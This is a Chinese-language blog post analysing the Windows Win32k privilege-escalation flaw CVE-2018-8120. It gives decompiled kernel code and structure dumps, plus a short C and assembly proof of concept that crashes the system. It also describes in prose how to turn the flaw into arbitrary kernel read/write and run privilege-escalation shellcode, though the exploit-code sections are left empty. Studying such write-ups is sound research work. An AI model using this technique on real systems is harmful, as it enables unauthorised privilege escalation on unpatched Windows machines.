<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="Let_go"><meta name="renderer" content="webkit"><meta name="copyright" content="Let_go"><meta name="keywords" content="Let_go"><meta name="description" content="null"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>CVE-2018-8120 · Mr.Chen's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
  "use strict";
  // rel=preload support test
  if( !w.loadCSS ){
    w.loadCSS = function(){};
  }
  // define on the loadCSS obj
  var rp = loadCSS.relpreload = {};
  // rel=preload feature support test
  // runs once and returns a function for compat purposes
  rp.support = (function(){
    var ret;
    try {
      ret = w.document.createElement( "link" ).relList.supports( "preload" );
    } catch (e) {
      ret = false;
    }
    return function(){
      return ret;
    };
  })();

  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
  // then change that media back to its intended value on load
  rp.bindMediaToggle = function( link ){
    // remember existing media attr for ultimate state, or default to 'all'
    var finalMedia = link.media || "all";

    function enableStylesheet(){
      link.media = finalMedia;
    }

    // bind load handlers to enable media
    if( link.addEventListener ){
      link.addEventListener( "load", enableStylesheet );
    } else if( link.attachEvent ){
      link.attachEvent( "onload", enableStylesheet );
    }

    // Set rel and non-applicable media type to start an async request
    // note: timeout allows this to happen async to let rendering continue in IE
    setTimeout(function(){
      link.rel = "stylesheet";
      link.media = "only x";
    });
    // also enable media after 3 seconds,
    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
    setTimeout( enableStylesheet, 3000 );
  };

  // loop through link elements in DOM
  rp.poly = function(){
    // double check this to prevent external calls from running
    if( rp.support() ){
      return;
    }
    var links = w.document.getElementsByTagName( "link" );
    for( var i = 0; i < links.length; i++ ){
      var link = links[ i ];
      // qualify links to those with rel=preload and as=style attrs
      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
        // prevent rerunning on link
        link.setAttribute( "data-loadcss", true );
        // bind listeners to toggle media back
        rp.bindMediaToggle( link );
      }
    }
  };

  // if unsupported, run the polyfill
  if( !rp.support() ){
    // run once at least
    rp.poly();

    // rerun poly on an interval until onload
    var run = w.setInterval( rp.poly, 500 );
    if( w.addEventListener ){
      w.addEventListener( "load", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    } else if( w.attachEvent ){
      w.attachEvent( "onload", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    }
  }


  // commonjs
  if( typeof exports !== "undefined" ){
    exports.loadCSS = loadCSS;
  }
  else {
    w.loadCSS = loadCSS;
  }
}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/avatar.jpg"></div><!--.profile-saying
  i.fa.fa-comment
  .saying--><div class="cxo-profile-inner"><div class="profile-name">Let_go</div><div class="profile-signature">人生如棋,我愿为卒。行动虽慢,可谁曾见我后退一步。</div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Mr.Chen's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about">About</a><a href="/archives">Archives</a><a href="/tags">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about">About</a><a href="/archives">Archives</a><a href="/tags">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">CVE-2018-8120</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2018/08/26</span></span><span class="busuanzi-pv" id="busuanzi_container_page_pv"><i class="post-intro-calendar fa fa-user-o"></i><span id="busuanzi_value_page_pv"></span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="Windows_Kernel"> Windows_Kernel</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="CVE-2018-8120"><a href="#CVE-2018-8120" class="headerlink" title="CVE-2018-8120"></a>CVE-2018-8120</h1><hr>
<h2 id="相关信息："><a href="#相关信息：" class="headerlink" title="相关信息："></a>相关信息：</h2><p>An elevation of privilege vulnerability exists in Windows when the Win32k component fails to properly handle objects in memory, aka “Win32k Elevation of Privilege Vulnerability.” This affects Windows Server 2008, Windows 7, Windows Server 2008 R2. (当win32k组件无法正确处理内存中的对象时，windows中就存在一个空指针解引用漏洞，可以用来做特权提升，即”Win32k特权漏洞提升”,这会影响Windows Server2008，windows 7和windows server 2008  r2)<br>补丁链接：<a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8120" target="_blank" rel="external">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8120</a></p>
<h3 id="测试环境："><a href="#测试环境：" class="headerlink" title="测试环境："></a>测试环境：</h3><p>OS 名称: Microsoft Windows 7 专业版-&gt;X64<br>OS 版本: 6.1.7600  Build 7600</p>
<h3 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h3><p>在win32k.sys的NtUserSetImeInfoEx函数中，因为未对窗口站rpwinsta变量的spklList元素做是否为空的检测，导致在使用spklList的时候会存在一个空指针解引用的问题，如果当前进程创建一个spklList成员为null的窗口站，然后将这个新创建的窗口站与当前进程关联，在调用NtUserSetImeInfoEx函数对输入法设置扩展IME信息时，将会获取spklList成员指向的内存中的数据，因为此时该成员为0，所以就会访问位于用户地址空间的零号内存。因为默认零号内存是未映射的所以此操作会导致页面错误，导致系统蓝屏发生。<br>常见的利用思路可以事先把零号内存申请出来，然后在用户层构造假的tagKL内核对象，导致内核会误认为是正确的键盘布局tagKL节点对象，从而实现任意地址写任意值的目的，当我们能够实现任意地址任意写后我们可以把特定的内核对象的函数指针字段修改为我们shellcode的地址或修改内核模式或用户模式的执行的相关标志位，然后就有了任意代码执行的能力。</p>
<h2 id="漏洞细节："><a href="#漏洞细节：" class="headerlink" title="漏洞细节："></a>漏洞细节：</h2><p>首先我们来熟悉一下NtUserSetImeInfoEx函数，该函数主要是用于将用户进程定义的输入法扩展信息IME对象设置成当前进程所关联的窗口站中的键盘布局节点对象中的IME对象。<br>该函数存放于win32k.sys文件中，可以获取测试机中的win32k.sys文件，让ida进行反编译，以下是我测试环境中的NtUserSetImeInfoEx函数，<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">__int64 __<span class="function">fastcall <span class="title">NtUserSetImeInfoEx</span><span class="params">(tagIMEINFOEX *Src)</span></span></div><div class="line">&#123;</div><div class="line">  tagIMEINFOEX *v1; <span class="comment">// rbx</span></div><div class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// ebx</span></div><div class="line">  tagIMEINFOEX *v3; <span class="comment">// rcx</span></div><div class="line">  <span class="keyword">char</span> v4; <span class="comment">// al</span></div><div class="line">  tagWINDOWSTATION *rpwinsta; <span class="comment">// rcx</span></div><div class="line">  _tagKL *pkl; <span class="comment">// rax</span></div><div class="line">  tagIMEINFOEX *v7; <span class="comment">// rcx</span></div><div class="line">  HKL__ *ime_info_ex; <span class="comment">// [rsp+20h] [rbp-178h]</span></div><div class="line">  v1 = Src;</div><div class="line">  *(_QWORD *)&amp;gptiCurrent = ExEnterPriorityRegionAndAcquireResourceExclusive(gpresUser);</div><div class="line">  gbValidateHandleForIL = <span class="number">1</span>;</div><div class="line">  <span class="keyword">if</span> ( *gpsi &amp; <span class="number">4</span> )</div><div class="line">  &#123;</div><div class="line">    v3 = v1;</div><div class="line">    <span class="keyword">if</span> ( v1 &gt;= W32UserProbeAddress )</div><div class="line">      v3 = (tagIMEINFOEX *)W32UserProbeAddress;</div><div class="line">    v4 = (<span class="keyword">char</span>)v3-&gt;hkl;</div><div class="line">    memmove(&amp;ime_info_ex, v1, <span class="number">0x160</span>ui64);</div><div class="line">    rpwinsta = *(tagWINDOWSTATION **)(PsGetCurrentProcessWin32Process() + <span class="number">0x258</span>i64);    <span class="comment">/*-[ 1 ]-*/</span></div><div class="line">    v2 = <span class="number">0</span>;</div><div class="line">    <span class="keyword">if</span> ( rpwinsta )                                                                     <span class="comment">/*-[ 2 ]-*/</span></div><div class="line">    &#123;</div><div class="line">      pkl = (_tagKL *)rpwinsta-&gt;spklList;                                               <span class="comment">/*-[ 3 ]-*/</span></div><div class="line">      <span class="keyword">while</span> ( pkl-&gt;hkl != ime_info_ex )                                                 <span class="comment">/*-[ 4 ]-*/</span></div><div class="line">      &#123;</div><div class="line">        pkl = pkl-&gt;pklNext; </div><div class="line">        <span class="keyword">if</span> ( pkl == rpwinsta-&gt;spklList )                                                                                        </div><div class="line">          <span class="keyword">goto</span> LABEL_14;</div><div class="line">      &#125;</div><div class="line">      v7 = pkl-&gt;piiex;                                                                  <span class="comment">/*-[ 5 ]-*/</span></div><div class="line">      <span class="keyword">if</span> ( v7 )</div><div class="line">      &#123;</div><div class="line">        <span class="keyword">if</span> ( !v7-&gt;fLoadFlag )</div><div class="line">          memmove(v7, &amp;ime_info_ex, <span class="number">0x160</span>ui64);                                         <span class="comment">/*-[ 6 ]-*/</span></div><div class="line">        v2 = <span class="number">1</span>;</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span>&#123;</div><div class="line">    UserSetLastError(<span class="number">0x78</span>i64);</div><div class="line">    v2 = <span class="number">0</span>;</div><div class="line">  &#125;</div><div class="line">LABEL_14:</div><div class="line">  UserSessionSwitchLeaveCrit();</div><div class="line">  <span class="keyword">return</span> v2;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>首先熟悉一下该函数的执行流程。<br>[1]-获取当前进程的窗口站对象rpwinsta，什么是窗口站？<br>    窗口站是一个内核对象，包含剪切板，原子表和一个或多个桌面对象，每个窗口站对象作为结构体tagWINDOWSTATION的实例存在于内核中，以下为窗口站结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>: kd &gt; dt win32k!tagWINDOWSTATION</div><div class="line">+ <span class="number">0x000</span> dwSessionId      : Uint4B</div><div class="line">+ <span class="number">0x008</span> rpwinstaNext : Ptr64 tagWINDOWSTATION</div><div class="line">+ <span class="number">0x010</span> rpdeskList : Ptr64 tagDESKTOP</div><div class="line">+ <span class="number">0x018</span> pTerm : Ptr64 tagTERMINAL</div><div class="line">+ <span class="number">0x020</span> dwWSF_Flags : Uint4B</div><div class="line">+ <span class="number">0x028</span> spklList : Ptr64 tagKL</div><div class="line">+ <span class="number">0x030</span> ptiClipLock : Ptr64 tagTHREADINFO</div><div class="line">+ <span class="number">0x038</span> ptiDrawingClipboard : Ptr64 tagTHREADINFO</div><div class="line">+ <span class="number">0x040</span> spwndClipOpen : Ptr64 tagWND</div><div class="line">+ <span class="number">0x048</span> spwndClipViewer : Ptr64 tagWND</div><div class="line">+ <span class="number">0x050</span> spwndClipOwner : Ptr64 tagWND</div><div class="line">+ <span class="number">0x058</span> pClipBase : Ptr64 tagCLIP</div><div class="line">+ <span class="number">0x060</span> cNumClipFormats : Uint4B</div><div class="line">+ <span class="number">0x064</span> iClipSerialNumber : Uint4B</div><div class="line">+ <span class="number">0x068</span> iClipSequenceNumber : Uint4B</div><div class="line">+ <span class="number">0x070</span> spwndClipboardListener : Ptr64 tagWND</div><div class="line">+ <span class="number">0x078</span> pGlobalAtomTable : Ptr64 Void</div><div class="line">+ <span class="number">0x080</span> luidEndSession : _LUID</div><div class="line">+ <span class="number">0x088</span> luidUser : _LUID</div><div class="line">+ <span class="number">0x090</span> psidUser : Ptr64 Void</div></pre></td></tr></table></figure></p>
<p>[2]-判断当前窗口站rpwinsta是否为空，如果不为空就执行[3]。<br>[3]-根据当前窗口站rpwinsta获取spklList成员，spklList指向的是关联的键盘布局对象链表的第一个节点指针，键盘布局tagKL结构体定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>: kd &gt; dt win32k!tagKL</div><div class="line">+ <span class="number">0x000</span> head             : _HEAD</div><div class="line">+ <span class="number">0x010</span> pklNext : Ptr64 tagKL</div><div class="line">+ <span class="number">0x018</span> pklPrev : Ptr64 tagKL</div><div class="line">+ <span class="number">0x020</span> dwKL_Flags : Uint4B</div><div class="line">+ <span class="number">0x028</span> hkl : Ptr64 HKL__</div><div class="line">+ <span class="number">0x030</span> spkf : Ptr64 tagKBDFILE</div><div class="line">+ <span class="number">0x038</span> spkfPrimary : Ptr64 tagKBDFILE</div><div class="line">+ <span class="number">0x040</span> dwFontSigs : Uint4B</div><div class="line">+ <span class="number">0x044</span> iBaseCharset : Uint4B</div><div class="line">+ <span class="number">0x048</span> CodePage : Uint2B</div><div class="line">+ <span class="number">0x04a</span> wchDiacritic : Wchar</div><div class="line">+ <span class="number">0x050</span> piiex : Ptr64 tagIMEINFOEX</div><div class="line">+ <span class="number">0x058</span> uNumTbl : Uint4B</div><div class="line">+ <span class="number">0x060</span> pspkfExtra : Ptr64 Ptr64 tagKBDFILE</div><div class="line">+ <span class="number">0x068</span> dwLastKbdType : Uint4B</div><div class="line">+ <span class="number">0x06c</span> dwLastKbdSubType : Uint4B</div><div class="line">+ <span class="number">0x070</span> dwKLID : Uint4B</div></pre></td></tr></table></figure></p>
<p>[4]-遍历关联键盘布局对象链表，该循环存在两个出口</p>
<pre><code>1. 当遍历到的键盘布局对象的hkl成员等于传入的IME对象时结束循环，这种情况表示找到了hkl等于传入的IME对象的键盘布局对象，然后结束循环，执行[5]
2. 当遍历到的键盘布局对象再次等于第一个键盘布局对象节点时，这种情况表示链表遍历完毕后还未找到目标对象，所以直接跳到函数的末尾。
</code></pre><p>[5]-获取目标键盘布局对象中的piiex成员，piiex成员指向需要关联的输入法扩展IME信息对象，结构如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="number">0</span>: kd&gt; dt win32k!tagIMEINFOEX</div><div class="line">+ <span class="number">0x000</span> hkl              : Ptr64 HKL__</div><div class="line">+ <span class="number">0x008</span> ImeInfo : tagIMEINFO</div><div class="line">+ <span class="number">0x024</span> wszUIClass : [<span class="number">16</span>] Wchar</div><div class="line">+ <span class="number">0x044</span> fdwInitConvMode : Uint4B</div><div class="line">+ <span class="number">0x048</span> fInitOpen : Int4B</div><div class="line">+ <span class="number">0x04c</span> fLoadFlag : Int4B</div><div class="line">+ <span class="number">0x050</span> dwProdVersion : Uint4B</div><div class="line">+ <span class="number">0x054</span> dwImeWinVersion : Uint4B</div><div class="line">+ <span class="number">0x058</span> wszImeDescription : [<span class="number">50</span>] Wchar</div><div class="line">+ <span class="number">0x0bc</span> wszImeFile : [<span class="number">80</span>] Wchar</div><div class="line">+ <span class="number">0x15c</span> fSysWow64Only : Pos <span class="number">0</span>, <span class="number">1</span> Bit</div><div class="line">+ <span class="number">0x15c</span> fCUASLayer : Pos <span class="number">1</span>, <span class="number">1</span> Bit</div></pre></td></tr></table></figure></p>
<p>[6]-最终的拷贝操作，如果目标键盘布局对象不为空，并且fLoadFlag成员为false，那么就把传入的IME对象拷贝到目标键盘布局对象的piiex成员指向的IME信息对象处。</p>
<p>通过补丁对比可以知道补丁其实就是在[2]的位置对当前窗口站rpwinsta变量的spklList成员做是否为空的检测，这样我们就知道了修补的漏洞可能是因为spklList为空导致的，假设spklList为空，那么在接下来的访问操作中就会触发访问异常问题，从而导致BSOD(Blue Screen of Death)。</p>
<h2 id="漏洞验证："><a href="#漏洞验证：" class="headerlink" title="漏洞验证："></a>漏洞验证：</h2><h3 id="poc："><a href="#poc：" class="headerlink" title="poc："></a>poc：</h3><p>当用户进程调用CreateWindowStation函数创建一个新的窗口站时，新的窗口站对象的spklList成员是没有被初始化的，默认指向NULL地址，然后使用SetProcessWindowsStation将新窗口站与当前进程关联起来，再通过调用NtUserSetImeInfoEx函数来触发该漏洞，从而验证漏洞的存在。<br>CVE-2018-8120-poc.cpp<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PSAPI_VERSION 1</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Psapi.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt; </span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"Psapi.lib"</span>)</span></div><div class="line"><span class="keyword">struct</span> tagIMEINFO32&#123;</div><div class="line">       <span class="keyword">unsigned</span> <span class="keyword">int</span> dwPrivateDataSize;</div><div class="line">       <span class="keyword">unsigned</span> <span class="keyword">int</span> fdwProperty;</div><div class="line">       <span class="keyword">unsigned</span> <span class="keyword">int</span> fdwConversionCaps;</div><div class="line">       <span class="keyword">unsigned</span> <span class="keyword">int</span> fdwSentenceCaps;</div><div class="line">       <span class="keyword">unsigned</span> <span class="keyword">int</span> fdwUICaps;</div><div class="line">       <span class="keyword">unsigned</span> <span class="keyword">int</span> fdwSCSCaps;</div><div class="line">       <span class="keyword">unsigned</span> <span class="keyword">int</span> fdwSelectCaps;</div><div class="line">&#125;;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> tagIMEINFOEX&#123;</div><div class="line">       HKL__ *hkl;</div><div class="line">       tagIMEINFO32 ImeInfo;</div><div class="line">       <span class="keyword">wchar_t</span> wszUIClass[<span class="number">16</span>];</div><div class="line">       <span class="keyword">unsigned</span> <span class="keyword">int</span> fdwInitConvMode;</div><div class="line">       <span class="keyword">int</span> fInitOpen;</div><div class="line">       <span class="keyword">int</span> fLoadFlag;</div><div class="line">       <span class="keyword">unsigned</span> <span class="keyword">int</span> dwProdVersion;</div><div class="line">       <span class="keyword">unsigned</span> <span class="keyword">int</span> dwImeWinVersion;</div><div class="line">       <span class="keyword">wchar_t</span> wszImeDescription[<span class="number">50</span>];</div><div class="line">       <span class="keyword">wchar_t</span> wszImeFile[<span class="number">80</span>];</div><div class="line">       __int32 fSysWow64Only : <span class="number">1</span>;</div><div class="line">       __int32 fCUASLayer : <span class="number">1</span>;</div><div class="line">&#125;IMEINFOEX, *PIMEINFOEX;</div><div class="line"><span class="keyword">extern</span> <span class="string">"C"</span> <span class="function"><span class="keyword">void</span> <span class="title">NtUserSetImeInfoEx</span><span class="params">(PVOID)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">       IMEINFOEX ime;</div><div class="line">       RtlSecureZeroMemory(&amp;ime, <span class="keyword">sizeof</span>(IMEINFOEX));</div><div class="line">       HWINSTA hSta = CreateWindowStationW(<span class="number">0</span>,<span class="number">0</span>,READ_CONTROL,<span class="number">0</span>);</div><div class="line">       SetProcessWindowStation(hSta);</div><div class="line">       NtUserSetImeInfoEx((PVOID)&amp;ime);</div><div class="line">       <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>asm.asm<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> NtUserSetImeInfoEx</div><div class="line">_TEXT SEGMENT</div><div class="line">NtUserSetImeInfoEx PROC</div><div class="line">       mov r10,rcx;</div><div class="line">       mov eax,<span class="number">4871</span>;</div><div class="line">       syscall;</div><div class="line">       ret;</div><div class="line">NtUserSetImeInfoEx ENDP</div><div class="line">_TEXT  ENDS</div><div class="line">END</div></pre></td></tr></table></figure></p>
<p>因为我的虚拟机是X64，而vs2015编译x64程序不支持内联汇编，所以需要新创建一个.asm文件来写汇编代码，编译生成的方式可以参考：vs2015下汇编代码与c/c++代码混合编程</p>
<p>poc编译完成后，甩到虚拟机中遛一遛，会发现直接把虚拟机给打蓝屏了，ok，就是要的这个效果<br>但是这还没有达到我们最终的目的，我们的目的是特权提升，继续我们的利用之路</p>
<h2 id="漏洞利用："><a href="#漏洞利用：" class="headerlink" title="漏洞利用："></a>漏洞利用：</h2><h3 id="构造数据："><a href="#构造数据：" class="headerlink" title="构造数据："></a>构造数据：</h3><p>通过前面的分析我们知道，该漏洞主要是访问零地址的时候因为零地址未被映射而导致访问异常，如果我们能够事先把零页给映射出来，然后再精心构造一下这块内存的数据，这样不但不会导致内核出现访问异常，还可以控制内核的执行逻辑，从而实现提权操作。</p>
<p>首先我们需要把0地址内存给申请出来，这里关于虚拟空间分布的知识需要了解。</p>
<ol>
<li>32位windows系统中，可使用的虚拟地址空间大小共计2^32字节（4GB）。通常低地址的2GB用于用户空间，而高地址的2GB用于内核空间。</li>
<li>64位windows系统中，虚拟地址空间理论上的大小为2^64字节，但实际只使用了一部分，范围从0x000’0000’0000至0x7FF’FFFF’FFFF的8TB用于用户空间，范围从0xFFFF’0800’0000’0000至0xFFFF’FFFF’FFFF’FFFF的248TB的部分用于内核空间。</li>
</ol>
<p>而空指针赋值分区是进程地址空间中从0x0000’0000到0x0000’FFFF的闭区间，保留该分区的目的是为了帮助程序员捕获对空指针的赋值，而如果进程中的线程试图读取或写入位于这一分区的内存地址，则会引发访问异常。</p>
<p>虚拟地址分区<br>x86普通模式<br>x86 3G用户模式<br>x64 64位Windows<br>空指针赋值分区<br>0x00000000<br>0x0000FFFF<br>0x00000000<br>0x0000FFFF<br>0x00000000 00000000<br>0x00000000 0000FFFF<br>用户模式分区<br>0x00010000<br>0x7FFEFFFF<br>0x0001000<br>0xBFFEFFFF<br>0x00000000 00010000<br>0x000007FF FFFEFFFF<br>64KB禁入分区<br>0x7FFF0000<br>0x7FFFFFFF<br>0xBFFF0000<br>0xBFFFFFFF<br>0x000007FF FFFF0000<br>0x000007FF FFFFFFFF<br>内核模式分区<br>0x80000000<br>0xFFFFFFFF<br>0xC0000000<br>0xFFFFFFFF<br>0x00000800 00000000<br>0xFFFFFFFF FFFFFFFF<br>虚拟地址空间分布表</p>
<pre><code>1. 映射零页地址
2. 构造零页内存
</code></pre><p>Bitmap GDI函数实现内核任意地址读/写<br>通过修改Bitmap GDI函数关键对象的方式可以将有限的任意地址写漏洞转化为内核任意地址读/写。<br>当创建一个bitmap时，一个结构体被附加在进程PEB的GdiSharedHandleTable成员中。GdiSharedHandleTable是一个GDICELL64结构体数组的指针<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">typedf <span class="keyword">struct</span>&#123;</div><div class="line">    PVOID64 pKernelAddress;</div><div class="line">    USHORT  wProcessId;</div><div class="line">    USHORT  wCount;</div><div class="line">    USHORT  wupper;</div><div class="line">    USHORT  wType;</div><div class="line">    PVOID64 pUserAddress;</div><div class="line">&#125; GDICELL64;</div></pre></td></tr></table></figure></p>
<p>通过以下的方式获取Bitmap的内核地址：</p>
<h3 id="触发漏洞"><a href="#触发漏洞" class="headerlink" title="触发漏洞:"></a>触发漏洞:</h3><p>首先通过ba e 1 win32k!NtUserSetImeInfoEx对漏洞函数下断<br>通过syscall调用漏洞函数NtUserSetImeInfoEx，并把我们构建好的内存布局当做参数传入，<br>紧接着内核就会断在win32k!NtUserSetImeInfo函数调用处，来看下我们传给内核的应用层的数据，通过r 输出当前寄存器信息可以看到rcx指向的就是我们应用层构造的数据，单步运行<br>接着内核会通过win32k!memmove函数把应用层的内存数据（0x1c3980）拷贝到内核内存（0xfffff88002943a60）中</p>
<p>接着内核调用PsGetCurrentProcessWin32Process函数获取当前进程的窗口站对象rpwinsta，并索引rpwinsta中的spklList元素，由于存在漏洞，并没有对获取到的pkl元素做合法检查，导致存在0地址解引用的问题，可以看到此时的rax等于0，紧接着索引pkl-&gt;hkl[rax+0x28]的数据，并与ime_info_ex进行比较，如果不等就进入循环，因为我们在触发漏洞之前对0号内存做映射了，所以pkl-&gt;hk和ime_info_ex都是我们可控的，这里的循环我们可以直接绕过。</p>
<p>循环完毕后会索引pkl-&gt;piiex的数据，如果获取的数据不为NULL，并且数据偏移0x4c中的值为0，那么就调用win32k!memmove函数直接把ime_info_ex指向的内存拷贝到pkl-&gt;piiex指向的位置，因为我们在最开始把pkl-&gt;piiex设置成了mpv，所以这里的拷贝就相当于对mpv做写操作，写入的内容是ime_info_ex中的内容，而ime_info_ex前8个字节存放的是wpv的地址，这就相当于把wpv写入到mpv中，我们的GDI内核任意读写就构造好了，接下来使用Gdi32的GetBitmapBits/SetBitmapBits两个函数来实现任意读写的功能，这样就成功完成了把有限的任意地址写转换成内核任意地址读/写。</p>
<p>有了任意读写的功能之后，我们可以替换HalDispatchTable里面的HalQuerySystemInformation函数指针为我们的提权shellcode，替换完成后调用NtQueryIntervalProfile来触发shellcode进行提权。</p>
<h3 id="GDI任意读-写"><a href="#GDI任意读-写" class="headerlink" title="GDI任意读/写"></a>GDI任意读/写</h3><h3 id="函数指针修改"><a href="#函数指针修改" class="headerlink" title="函数指针修改"></a>函数指针修改</h3><h3 id="提权shellcode"><a href="#提权shellcode" class="headerlink" title="提权shellcode"></a>提权shellcode</h3><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://paper.seebug.org/602/" target="_blank" rel="external">https://paper.seebug.org/602/</a>  文章<br><a href="https://github.com/bigric3/cve-2018-8120">https://github.com/bigric3/cve-2018-8120</a>  32位源码<br><a href="https://github.com/unamer/CVE-2018-8120">https://github.com/unamer/CVE-2018-8120</a> 64位源码</p>
